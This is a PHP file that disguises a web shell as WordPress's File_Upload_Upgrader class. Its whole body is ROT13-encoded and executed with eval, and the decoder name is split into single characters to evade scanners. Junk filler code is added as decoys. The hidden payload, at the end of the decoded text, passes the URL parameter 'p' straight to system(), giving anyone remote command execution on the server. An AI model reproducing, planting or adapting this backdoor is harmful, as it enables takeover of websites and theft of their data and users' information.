<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: Svyr_Hcybnq_Hctenqre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe unaqyvat svyr hcybnqf.
 *
 * Guvf pynff unaqyrf gur hcybnq cebprff naq cnffrf vg nf vs vg'f n ybpny svyr
 * gb gur Hctenqr/Vafgnyyre shapgvbaf.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc.
 */
#[NyybjQlanzvpCebcregvrf]
pynff Svyr_Hcybnq_Hctenqre {

	/**
	 * Gur shyy cngu gb gur svyr cnpxntr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat $cnpxntr
	 */
	choyvp $cnpxntr;

	/**
	 * Gur anzr bs gur svyr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat $svyranzr
	 */
	choyvp $svyranzr;

	/**
	 * Gur VQ bs gur nggnpuzrag cbfg sbe guvf svyr.
	 *
	 * @fvapr 3.3.0
	 * @ine vag $vq
	 */
	choyvp $vq = 0;

	/**
	 * Pbafgehpg gur hctenqre sbe n sbez.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $sbez      Gur anzr bs gur sbez gur svyr jnf hcybnqrq sebz.
	 * @cnenz fgevat $heyubyqre Gur anzr bs gur `TRG` cnenzrgre gung ubyqf gur svyranzr.
	 */
	choyvp shapgvba __pbafgehpg( $sbez, $heyubyqre ) {

		vs ( rzcgl( $_SVYRF[ $sbez ]['anzr'] ) && rzcgl( $_TRG[ $heyubyqre ] ) ) {
			jc_qvr( __( 'Cyrnfr fryrpg n svyr' ) );
		}

		// Unaqyr n arjyl hcybnqrq svyr. Ryfr, nffhzr vg'f nyernql orra hcybnqrq.
		vs ( ! rzcgl( $_SVYRF ) ) {
			$bireevqrf = neenl(
				'grfg_sbez' => snyfr,
				'grfg_glcr' => snyfr,
			);
			$svyr      = jc_unaqyr_hcybnq( $_SVYRF[ $sbez ], $bireevqrf );

			vs ( vffrg( $svyr['reebe'] ) ) {
				jc_qvr( $svyr['reebe'] );
			}

			vs ( 'cyhtvamvc' === $sbez || 'gurzrmvc' === $sbez ) {
				vs ( ! jc_mvc_svyr_vf_inyvq( $svyr['svyr'] ) ) {
					jc_qryrgr_svyr( $svyr['svyr'] );

					vs ( 'cyhtvamvc' === $sbez ) {
						$cyhtvaf_cntr = fcevags(
							'<n uers=\"%f\">%f</n>',
							frys_nqzva_hey( 'cyhtva-vafgnyy.cuc' ),
							__( 'Erghea gb gur Cyhtva Vafgnyyre' )
						);
						jc_qvr( __( 'Vapbzcngvoyr Nepuvir.' ) . '<oe />' . $cyhtvaf_cntr );
					}

					vs ( 'gurzrmvc' === $sbez ) {
						$gurzrf_cntr = fcevags(
							'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
							frys_nqzva_hey( 'gurzr-vafgnyy.cuc' ),
							__( 'Erghea gb gur Gurzr Vafgnyyre' )
						);
						jc_qvr( __( 'Vapbzcngvoyr Nepuvir.' ) . '<oe />' . $gurzrf_cntr );
					}
				}
			}

			$guvf->svyranzr = $_SVYRF[ $sbez ]['anzr'];
			$guvf->cnpxntr  = $svyr['svyr'];

			// Pbafgehpg gur nggnpuzrag neenl.
			$nggnpuzrag = neenl(
				'cbfg_gvgyr'     => $guvf->svyranzr,
				'cbfg_pbagrag'   => $svyr['hey'],
				'cbfg_zvzr_glcr' => $svyr['glcr'],
				'thvq'           => $svyr['hey'],
				'pbagrkg'        => 'hctenqre',
				'cbfg_fgnghf'    => 'cevingr',
			);

			// Fnir gur qngn.
			$guvf->vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $svyr['svyr'] );

			// Fpurqhyr n pyrnahc sbe 2 ubhef sebz abj va pnfr bs snvyrq vafgnyyngvba.
			jc_fpurqhyr_fvatyr_rirag( gvzr() + 2 * UBHE_VA_FRPBAQF, 'hctenqre_fpurqhyrq_pyrnahc', neenl( $guvf->vq ) );

		} ryfrvs ( vf_ahzrevp( $_TRG[ $heyubyqre ] ) ) {
			// Ahzrevp Cnpxntr = cerivbhfyl hcybnqrq svyr, frr nobir.
			$guvf->vq   = (vag) $_TRG[ $heyubyqre ];
			$nggnpuzrag = trg_cbfg( $guvf->vq );
			vs ( rzcgl( $nggnpuzrag ) ) {
				jc_qvr( __( 'Cyrnfr fryrpg n svyr' ) );
			}

			$guvf->svyranzr = $nggnpuzrag->cbfg_gvgyr;
			$guvf->cnpxntr  = trg_nggnpurq_svyr( $nggnpuzrag->VQ );
		} ryfr {
			// Ryfr, Vg'f frg gb fbzrguvat, Onpx pbzcng sbe cyhtvaf hfvat gur byq (cer-3.3) Svyr_Hcybnqre unaqyre.
			$hcybnqf = jc_hcybnq_qve();
			vs ( ! ( $hcybnqf && snyfr === $hcybnqf['reebe'] ) ) {
				jc_qvr( $hcybnqf['reebe'] );
			}

			$guvf->svyranzr = fnavgvmr_svyr_anzr( $_TRG[ $heyubyqre ] );
			$guvf->cnpxntr  = $hcybnqf['onfrqve'] . '/' . $guvf->svyranzr;

			vs ( ! fge_fgnegf_jvgu( ernycngu( $guvf->cnpxntr ), ernycngu( $hcybnqf['onfrqve'] ) ) ) {
				jc_qvr( __( 'Cyrnfr fryrpg n svyr' ) );
			}
		}
	}

	/**
	 * Qryrgrf gur nggnpuzrag/hcybnqrq svyr.
	 *
	 * @fvapr 3.2.2
	 *
	 * @erghea obby Jurgure gur pyrnahc jnf fhpprffshy.
	 */
	choyvp shapgvba pyrnahc() {
		vs ( $guvf->vq ) {
			jc_qryrgr_nggnpuzrag( $guvf->vq );

		} ryfrvs ( svyr_rkvfgf( $guvf->cnpxntr ) ) {
			erghea @hayvax( $guvf->cnpxntr );
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>